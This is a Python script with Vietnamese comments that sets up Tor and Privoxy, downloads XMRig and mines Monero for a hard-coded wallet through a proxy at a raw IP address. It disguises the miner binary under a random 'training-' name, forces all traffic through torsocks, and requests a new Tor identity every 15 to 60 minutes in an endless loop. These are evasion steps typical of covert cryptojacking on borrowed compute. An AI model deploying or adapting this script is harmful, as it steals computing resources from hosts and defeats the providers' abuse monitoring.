import subprocess
import secrets
import shutil
import os
import time
import random  # Thêm thư viện random
from pathlib import Path
from stem import Signal
from stem.control import Controller

# Constants
VERSION = "6.21.0"
WORK_DIR = Path.home() / "work"
XMRIg_DIR = WORK_DIR / f"xmrig-{VERSION}"
POOL = "47.238.48.153:8080"  # Địa chỉ IP máy chủ trung gian và cổng proxy
USERNAME = "45edxp4yMGmELBAYxkzkmhjYKH85sNApENokaB3UpZXoMcinqEyH4bRZM1wnN3VGTkVqf7Ve7tqSCDPywne5XSP2VnmGi3y"
ALGO = "rx/0"
DONATE = "1"

# Step 1: Cài đặt Tor và Privoxy
def install_tor_privoxy():
    try:
        subprocess.run(["sudo", "apt-get", "update"], check=True)
        subprocess.run(["sudo", "apt-get", "install", "-y", "tor", "privoxy"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error installing Tor/Privoxy: {e}")
        return False
    return True

# Step 2: Cấu hình Privoxy để sử dụng Tor proxy
def configure_privoxy():
    try:
        with open("/etc/privoxy/config", "a") as config_file:
            config_file.write("\nforward-socks5t / 127.0.0.1:9050 .\n")  # Cấu hình proxy của Tor
    except Exception as e:
        print(f"Error configuring Privoxy: {e}")
        return False
    return True

# Step 3: Cấu hình Tor mà không yêu cầu mật khẩu
def configure_tor():
    try:
        with open("/etc/tor/torrc", "a") as torrc_file:
            torrc_file.write(f"\nControlPort 9051\n")  # Thiết lập cổng điều khiển cho Tor
    except Exception as e:
        print(f"Error configuring Tor: {e}")
        return False
    return True

# Step 4: Khởi động lại dịch vụ Tor và Privoxy
def restart_services():
    try:
        subprocess.run(["sudo", "systemctl", "restart", "tor"], check=True)
        subprocess.run(["sudo", "systemctl", "restart", "privoxy"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error restarting services: {e}")
        return False
    return True

# Step 5: Tải về XMRig
def download_xmrig():
    url = f"https://github.com/xmrig/xmrig/releases/download/v{VERSION}/xmrig-{VERSION}-linux-x64.tar.gz"
    try:
        subprocess.run(["wget", url, "-P", str(WORK_DIR)], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error downloading XMRig: {e}")
        return False
    return True

# Step 6: Giải nén XMRig
def extract_xmrig():
    try:
        subprocess.run(["tar", "-xvzf", str(WORK_DIR / f"xmrig-{VERSION}-linux-x64.tar.gz"), "-C", str(WORK_DIR)], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error extracting XMRig: {e}")
        return False
    return True

# Step 7: Đổi tên XMRig để ngẫu nhiên hóa
def rename_xmrig():
    xmrig_path = XMRIg_DIR / "xmrig"
    random_name = f"training-{secrets.randbelow(375)}-{secrets.randbelow(259)}"
    shutil.move(str(xmrig_path), str(WORK_DIR / random_name))
    return WORK_DIR / random_name

# Step 8: Thiết lập quyền thực thi cho XMRig
def set_permissions(xmrig_path):
    os.chmod(str(xmrig_path), 0o755)

# Step 9: Yêu cầu thay đổi IP qua Tor
def renew_connection():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()  # Không cần mật khẩu nếu không thiết lập HashedControlPassword
        controller.signal(Signal.NEWNYM)

# Step 10: Chạy XMRig thông qua Tor proxy bằng torsocks và thêm --no-huge-pages
def run_xmrig_through_tor(xmrig_path):
    xmrig_cmd = [
        "torsocks",  # Sử dụng torsocks để bắt buộc kết nối qua Tor
        str(xmrig_path),
        "--donate-level", DONATE,
        "-o", POOL,  # Kết nối qua máy chủ trung gian
        "-u", USERNAME,
        "-a", ALGO,
        "--no-huge-pages",  # Thêm tham số để vô hiệu hóa Huge Pages
        "-k", "--tls"  # Kết nối bảo mật
    ]
    return subprocess.Popen(xmrig_cmd)  # Chạy XMRig trong nền

# Step 11: Dừng XMRig
def stop_xmrig(xmrig_process):
    xmrig_process.terminate()
    xmrig_process.wait()

# Main
if __name__ == "__main__":
    if install_tor_privoxy() and configure_privoxy() and configure_tor() and restart_services():
        print("Tor và Privoxy đã được cài đặt và cấu hình thành công.")
        WORK_DIR.mkdir(parents=True, exist_ok=True)
        
        if download_xmrig() and extract_xmrig():
            xmrig_path = rename_xmrig()
            set_permissions(xmrig_path)

            # Chạy XMRig trong nền và tái kết nối sau khoảng thời gian ngẫu nhiên từ 15 đến 60 phút
            while True:
                # Khởi động XMRig
                xmrig_process = run_xmrig_through_tor(xmrig_path)

                # Đổi IP sau một khoảng thời gian ngẫu nhiên từ 15 đến 60 phút
                random_sleep = random.randint(900, 3600)  # Ngẫu nhiên từ 900s (15 phút) đến 3600s (60 phút)
                print(f"Chờ {random_sleep // 60} phút trước khi đổi IP...")
                time.sleep(random_sleep)
                renew_connection()  # Yêu cầu Tor đổi IP
                
                # Dừng XMRig và khởi động lại với IP mới
                stop_xmrig(xmrig_process)
    else:
        print("Có lỗi xảy ra trong quá trình cài đặt hoặc cấu hình.")
